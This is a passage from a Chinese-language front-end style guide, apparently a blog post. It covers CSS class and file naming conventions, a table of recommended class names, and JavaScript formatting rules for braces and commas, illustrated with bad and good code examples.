的命名（类似于命名空间）（例如，<code>.btn</code> 和 <code>.btn-danger</code>）。<br>避免过度任意的简写。<code>.btn</code> 代表 <em>button</em>，但是 <code>.s</code> 不能表达任何意思。<br>class 名称应当尽可能短，并且意义明确。<br>使用有意义的名称。使用有组织的或目的明确的名称，不要使用表现形式（presentational）的名称。<br>基于最近的父 class 或基本（base） class 作为新 class 的前缀。<br>使用 <code>.js-*</code> class 来标识行为（与样式相对），并且不要将这些 class 包含到 CSS 文件中。<br>在为 Sass 和 Less 变量命名时也可以参考上面列出的各项规范。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Bad example */</span><br><span class="line"><span class="string">.t</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"><span class="string">.red</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"><span class="string">.header</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"></span><br><span class="line">/* Good example */</span><br><span class="line"><span class="string">.tweet</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"><span class="string">.important</span> &#123; <span class="string">...</span> &#125;</span><br><span class="line"><span class="string">.tweet-header</span> &#123; <span class="string">...</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><ul><li>对于通用元素使用 class ，这样利于渲染性能的优化。</li><li>对于经常出现的组件，避免使用属性选择器（例如，<code>[class^=&quot;...&quot;]</code>）。浏览器的性能会受到这些因素的影响。</li><li>选择器要尽可能短，并且尽量限制组成选择器的元素个数，建议不要超过 3 。</li><li><strong>只有</strong>在必要的时候才将 class 限制在最近的父元素内（也就是后代选择器）（例如，不使用带前缀的 class 时 – 前缀类似于命名空间）。</li></ul><p>扩展阅读：</p><ul><li><a href="http://markdotto.com/2012/02/16/scope-css-classes-with-prefixes/">Scope CSS classes with prefixes</a></li><li><a href="http://markdotto.com/2012/03/02/stop-the-cascade/">Stop the cascade</a><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad example */</span></span><br><span class="line"><span class="selector-tag">span</span> &#123; ... &#125;</span><br><span class="line"><span class="selector-class">.page-container</span> <span class="selector-id">#stream</span> <span class="selector-class">.stream-item</span> <span class="selector-class">.tweet</span> <span class="selector-class">.tweet-header</span> <span class="selector-class">.username</span> &#123; ... &#125;</span><br><span class="line"><span class="selector-class">.avatar</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good example */</span></span><br><span class="line"><span class="selector-class">.avatar</span> &#123; ... &#125;</span><br><span class="line"><span class="selector-class">.tweet-header</span> <span class="selector-class">.username</span> &#123; ... &#125;</span><br><span class="line"><span class="selector-class">.tweet</span> <span class="selector-class">.avatar</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="代码组织"><a href="#代码组织" class="headerlink" title="代码组织"></a>代码组织</h3><ul><li>以组件为单位组织代码段。</li><li>制定一致的注释规范。</li><li>使用一致的空白符将代码分隔成块，这样利于扫描较大的文档。</li><li>如果使用了多个 CSS 文件，将其按照组件而非页面的形式分拆，因为页面会被重组，而组件只会被移动。<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Component section heading</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">.element</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Component section heading</span><br><span class="line"> *</span><br><span class="line"> * Sometimes you need to include optional context for the entire component. Do that up here<span class="built_in"> if </span>it&#x27;s important enough.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">.element</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">/* Contextual<span class="built_in"> sub-component </span>or modifer */</span><br><span class="line"><span class="keyword">.element</span>-heading &#123; ... &#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h1><h3 id="图片命名"><a href="#图片命名" class="headerlink" title="图片命名"></a>图片命名</h3><p><strong>图片命名建议以以下顺序命名：</strong><br>图片业务（可选） +（mod_）图片功能类别（必选）+ 图片模块名称（可选） + 图片精度（可选）</p><ul><li><p>图片业务：<br>pp_：拍拍<br>wx_：微信<br>sq_：手Q<br>jd_：京东商城</p></li><li><p>图片功能类别：<br>mod_：是否公共，可选<br>icon：模块类固化的图标<br>logo：LOGO类<br>spr：单页面各种元素合并集合<br>btn：按钮<br>bg：可平铺或者大背景</p></li><li><p>图片模块名称：<br>goodslist：商品列表<br>goodsinfo：商品信息<br>userava tar：用户头像</p></li><li><p>图片精度：<br>普清：@1x<br>Retina：@2x | @3x</p></li></ul><p>如下面例子：</p><blockquote><p>公共模块：<br><a href="mailto:&#x77;&#120;&#x5f;&#x6d;&#111;&#100;&#95;&#98;&#x74;&#x6e;&#95;&#x67;&#111;&#x6f;&#x64;&#x6c;&#105;&#115;&#116;&#x40;&#x32;&#120;&#x2e;&#112;&#x6e;&#103;">&#x77;&#120;&#x5f;&#x6d;&#111;&#100;&#95;&#98;&#x74;&#x6e;&#95;&#x67;&#111;&#x6f;&#x64;&#x6c;&#105;&#115;&#116;&#x40;&#x32;&#120;&#x2e;&#112;&#x6e;&#103;</a><br>wx_mod_btn_goodlist.png<br>mod_btn_goodlist.png</p><p>非公共模块：<br><a href="mailto:&#119;&#120;&#x5f;&#98;&#116;&#110;&#x5f;&#103;&#111;&#111;&#x64;&#108;&#x69;&#x73;&#x74;&#64;&#50;&#x78;&#x2e;&#112;&#110;&#103;">&#119;&#120;&#x5f;&#98;&#116;&#110;&#x5f;&#103;&#111;&#111;&#x64;&#108;&#x69;&#x73;&#x74;&#64;&#50;&#x78;&#x2e;&#112;&#110;&#103;</a><br>wx_btn_goodlist.png<br>btn_goodlist.png</p></blockquote><h3 id="HTML-x2F-CSS文件命名"><a href="#HTML-x2F-CSS文件命名" class="headerlink" title="HTML&#x2F;CSS文件命名"></a>HTML&#x2F;CSS文件命名</h3><p>确保文件命名总是以字母开头而不是数字，且字母一律小写，以下划线连接且不带其他标点符号，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line">jdc.html</span><br><span class="line">jdc_list.html</span><br><span class="line">jdc_detail.html</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SASS --&gt;</span></span><br><span class="line">jdc.scss</span><br><span class="line">jdc_list.scss</span><br><span class="line">jdc_detail.scss</span><br></pre></td></tr></table></figure><h3 id="ClassName命名"><a href="#ClassName命名" class="headerlink" title="ClassName命名"></a>ClassName命名</h3><p>祖先模块不能出现下划线，除了是全站公用模块，如 mod_ 系列的命名</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* Bad */</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Good*/</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这个是全站公用模块，祖先模块允许直接出现下划线 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_info&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_info_son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_info_son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在子孙模块数量可预测的情况下，严格继承祖先模块的命名前缀</p><blockquote><div class="modulename">　　<div class="modulename_cover"></div>　　<div class="modulename_info"></div></div></blockquote><p>当子孙模块超过4级或以上的时候，可以考虑在祖先模块内具有识辨性的独立缩写作为新的子孙模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;modulename&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_cover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_user&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_user_img&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_user_img_tit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_user_img_txt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    ...</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_list&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_cover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_user&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_user_img&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- 这个时候 miui 为 modulename_info_user_img 首字母缩写--&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;miui_tit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;miui_txt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    ...</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modulename_info_list&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="模块命名"><a href="#模块命名" class="headerlink" title="模块命名"></a>模块命名</h5><p>全站公共模块：以 mod_ 开头</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;mod_yours&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>业务公共模块：以 业务名_mod_ 开头</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;paipai_mod_yours&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="常用命名推荐"><a href="#常用命名推荐" class="headerlink" title="常用命名推荐"></a>常用命名推荐</h5><p><em><strong>注意：ad、banner、gg、guanggao 等有机会和广告挂勾的字眠不建议直接用来做ClassName，因为有些浏览器插件（Chrome的广告拦截插件等）会直接过滤这些类名，因此</strong></em></p><blockquote><div class="ad"></div>　　　// 这种广告的英文或拼音类名不应该出现</blockquote><p><strong>栗子🌰</strong></p><table><thead><tr><th>ClassName</th><th>含义</th></tr></thead><tbody><tr><td>about</td><td>关于</td></tr><tr><td>account</td><td>账户</td></tr><tr><td>arrow</td><td>箭头图标</td></tr><tr><td>article</td><td>文章</td></tr><tr><td>aside</td><td>边栏</td></tr><tr><td>audio</td><td>音频</td></tr><tr><td>avatar</td><td>头像</td></tr><tr><td>bg,background</td><td>背景</td></tr><tr><td>bar</td><td>栏（工具类）</td></tr><tr><td>branding</td><td>品牌化</td></tr><tr><td>crumb,breadcrumbs</td><td>面包屑</td></tr><tr><td>btn,button</td><td>按钮</td></tr><tr><td>caption</td><td>标题，说明</td></tr><tr><td>category</td><td>分类</td></tr><tr><td>chart</td><td>图表</td></tr><tr><td>clearfix</td><td>清除浮动</td></tr><tr><td>close</td><td>关闭</td></tr><tr><td>col,column</td><td>列</td></tr><tr><td>comment</td><td>评论</td></tr><tr><td>community</td><td>社区</td></tr><tr><td>container</td><td>容器</td></tr><tr><td>content</td><td>内容</td></tr><tr><td>copyright</td><td>版权</td></tr><tr><td>current</td><td>当前态，选中态</td></tr><tr><td>default</td><td>默认</td></tr><tr><td>description</td><td>描述</td></tr><tr><td>details</td><td>细节</td></tr><tr><td>disabled</td><td>不可用</td></tr><tr><td>entry</td><td>文章，博文</td></tr><tr><td>error</td><td>错误</td></tr><tr><td>even</td><td>偶数，常用于多行列表或表格中</td></tr><tr><td>fail</td><td>失败（提示）</td></tr><tr><td>feature</td><td>专题</td></tr><tr><td>fewer</td><td>收起</td></tr><tr><td>field</td><td>用于表单的输入区域</td></tr><tr><td>figure</td><td>图</td></tr><tr><td>filter</td><td>筛选</td></tr><tr><td>first</td><td>第一个，常用于列表中</td></tr><tr><td>footer</td><td>页脚</td></tr><tr><td>forum</td><td>论坛</td></tr><tr><td>gallery</td><td>画廊</td></tr><tr><td>group</td><td>模块，清除浮动</td></tr><tr><td>header</td><td>页头</td></tr><tr><td>help</td><td>帮助</td></tr><tr><td>hide</td><td>隐藏</td></tr><tr><td>hightlight</td><td>高亮</td></tr><tr><td>home</td><td>主页</td></tr><tr><td>icon</td><td>图标</td></tr><tr><td>info,information</td><td>信息</td></tr><tr><td>last</td><td>最后一个，常用于列表中</td></tr><tr><td>links</td><td>链接</td></tr><tr><td>login</td><td>登录</td></tr><tr><td>logout</td><td>退出</td></tr><tr><td>logo</td><td>标志</td></tr><tr><td>main</td><td>主体</td></tr><tr><td>menu</td><td>菜单</td></tr><tr><td>meta</td><td>作者、更新时间等信息栏，一般位于标题之下</td></tr><tr><td>module</td><td>模块</td></tr><tr><td>more</td><td>更多（展开）</td></tr><tr><td>msg,message</td><td>消息</td></tr><tr><td>nav,navigation</td><td>导航</td></tr><tr><td>next</td><td>下一页</td></tr><tr><td>nub</td><td>小块</td></tr><tr><td>odd</td><td>奇数，常用于多行列表或表格中</td></tr><tr><td>off</td><td>鼠标离开</td></tr><tr><td>on</td><td>鼠标移过</td></tr><tr><td>output</td><td>输出</td></tr><tr><td>pagination</td><td>分页</td></tr><tr><td>pop,popup</td><td>弹窗</td></tr><tr><td>preview</td><td>预览</td></tr><tr><td>previous</td><td>上一页</td></tr><tr><td>primary</td><td>主要</td></tr><tr><td>progress</td><td>进度条</td></tr><tr><td>promotion</td><td>促销</td></tr><tr><td>rcommd,recommendations</td><td>推荐</td></tr><tr><td>reg,register</td><td>注册</td></tr><tr><td>save</td><td>保存</td></tr><tr><td>search</td><td>搜索</td></tr><tr><td>secondary</td><td>次要</td></tr><tr><td>section</td><td>区块</td></tr><tr><td>selected</td><td>已选</td></tr><tr><td>share</td><td>分享</td></tr><tr><td>show</td><td>显示</td></tr><tr><td>sidebar</td><td>边栏，侧栏</td></tr><tr><td>slide</td><td>幻灯片，图片切换</td></tr><tr><td>sort</td><td>排序</td></tr><tr><td>sub</td><td>次级的，子级的</td></tr><tr><td>submit</td><td>提交</td></tr><tr><td>subscribe</td><td>订阅</td></tr><tr><td>subtitle</td><td>副标题</td></tr><tr><td>success</td><td>成功（提示）</td></tr><tr><td>summary</td><td>摘要</td></tr><tr><td>tab</td><td>标签页</td></tr><tr><td>table</td><td>表格</td></tr><tr><td>txt,text</td><td>文本</td></tr><tr><td>thumbnail</td><td>缩略图</td></tr><tr><td>time</td><td>时间</td></tr><tr><td>tips</td><td>提示</td></tr><tr><td>title</td><td>标题</td></tr><tr><td>video</td><td>视频</td></tr><tr><td>wrap</td><td>容器，包，一般用于最外层</td></tr><tr><td>wrapper</td><td>容器，包，一般用于最外层</td></tr></tbody></table><hr><p>#JS</p><h2 id="编码规范"><a href="#编码规范" class="headerlink" title="编码规范"></a>编码规范</h2><h3 id="单行代码块"><a href="#单行代码块" class="headerlink" title="单行代码块"></a>单行代码块</h3><p>在单行代码块中使用空格</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> <span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br><span class="line"><span class="keyword">if</span> (foo) &#123;bar = <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> <span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;</span><br><span class="line"><span class="keyword">if</span> (foo) &#123; bar = <span class="number">0</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="大括号风格"><a href="#大括号风格" class="headerlink" title="大括号风格"></a>大括号风格</h3><p>在编程过程中，大括号风格与缩进风格紧密联系，用来描述大括号相对代码块位置的方法有很多。在 JavaScript 中，主要有三种风格，如下：</p><ul><li>One True Brace Style<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">if</span></span> (<span class="variable">foo</span>) &#123;</span><br><span class="line">  <span class="function"><span class="title">bar</span>()</span></span><br><span class="line">&#125; <span class="variable"><span class="keyword">else</span></span> &#123;</span><br><span class="line">  <span class="function"><span class="title">baz</span>()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Stroustrup<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">if</span></span> (<span class="variable">foo</span>) &#123;</span><br><span class="line">  <span class="function"><span class="title">bar</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable"><span class="keyword">else</span></span> &#123;</span><br><span class="line">  <span class="function"><span class="title">baz</span>()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Allman<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">if</span></span> (<span class="variable">foo</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">bar</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable"><span class="keyword">else</span></span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">baz</span>()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>个人喜欢使用 <code>One True Brace Style </code>风格</p></blockquote></li></ul><h3 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h3><p>当命名变量时，主流分为驼峰式命名（variableName）和下划线命名（variable_name）两大阵营。</p><blockquote><p>个人喜欢使用下划线命名 &#x3D;。&#x3D;</p></blockquote><h3 id="拖尾逗号"><a href="#拖尾逗号" class="headerlink" title="拖尾逗号"></a>拖尾逗号</h3><p>在 ECMAScript5 里面，对象字面量中的拖尾逗号是合法的，但在 IE8（非 IE8 文档模式）下，当出现拖尾逗号，则会抛出错误。</p><p>拖尾逗号的例子：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  name: <span class="string">&#x27;foo&#x27;</span>,</span><br><span class="line">  age: <span class="string">&#x27;22&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拖尾逗号的好处是，简化了对象和数组添加或删除元素，我们只需要修改新增的行即可，并不会增加差异化的代码行数。</p><blockquote><p>因为拖尾逗号有好也有不好，所以团队约定允许在最后一个元素或属性与闭括号 ] 或 } 在不同行时，可以（但不要求）使用拖尾逗号。当在同一行时，禁止使用拖尾逗号。</p></blockquote><h3 id="逗号空格"><a href="#逗号空格" class="headerlink" title="逗号空格"></a>逗号空格</h3><p>逗号前后的空格可以提高代码的可读性，团队约定在逗号后面使用空格，逗号前面不加空格.</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span>,bar = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span> , bar = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span> ,bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span>, bar = <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="逗号风格"><a href="#逗号风格" class="headerlink" title="逗号风格"></a>逗号风格</h3><p>逗号分隔列表时，在 JavaScript 中主要有两种逗号风格：</p><ul><li>标准风格，逗号放置在当前行的末尾</li><li>逗号前置风格，逗号放置在下一行的开始位置<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span></span><br><span class="line">,</span><br><span class="line">bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span></span><br><span class="line">, bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = [<span class="string">&#x27;name&#x27;</span></span><br><span class="line">          , <span class="string">&#x27;age&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span>,</span><br><span class="line">    bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = [<span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;age&#x27;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>emmmmmm，还是使用标准风格看起来顺眼~</p></blockquote></li></ul><h3 id="计算属性的空格"><a href="#计算属性的空格" class="headerlink" 